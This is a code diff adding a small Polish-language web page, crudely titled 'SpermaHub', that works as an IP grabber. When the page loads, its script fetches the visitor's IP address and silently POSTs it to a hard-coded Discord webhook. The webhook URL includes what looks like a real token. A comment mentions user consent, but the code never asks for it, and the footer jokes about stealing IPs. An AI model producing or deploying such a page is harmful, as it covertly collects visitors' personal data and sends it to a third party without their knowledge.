@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <title>SpermaHub</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #0f0;
+      font-family: sans-serif;
+      text-align: center;
+      padding-top: 100px;
+    }
+    h1 {
+      font-size: 5rem;
+      color: white;
+    }
+    p {
+      font-size: 1.5rem;
+    }
+    .footer {
+      margin-top: 50px;
+      font-size: 1.2rem;
+      color: #ccc;
+    }
+  </style>
+</head>
+<body>
+  <h1><span style="color: #0f0">Sperma</span><span style="color: white">Hub</span></h1>
+  <p>Twój adres IP to: <span id="ip">Ładowanie...</span></p>
+  <p class="footer">[fa-security] Podpierdalanie IP lol. Github: <a href="https://github.com/0piorun" target="_blank">0piorun</a></p>
+
+  <script>
+    async function getIPAndSend() {
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const data = await ipRes.json();
+      document.getElementById('ip').innerText = data.ip;
+
+      // ✳️ Jeśli chcesz — wstaw swój webhook poniżej
+      const webhookUrl = "https://discord.com/api/webhooks/1389330375192346756/Q8VxNxk7lb8T9WIUr8jM7Mt1cGG4iA8iTwaYbrPvaO6RXZlvcrMTZYAd3QgutHPDvLt0";
+
+      // ⚠️ Wyślij tylko jeśli masz zgodę użytkownika!
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          content: `Nowe IP odwiedzającego: ${data.ip}`
+        })
+      });
+    }
+
+    getIPAndSend();
+  </script>
+</body>
+</html>
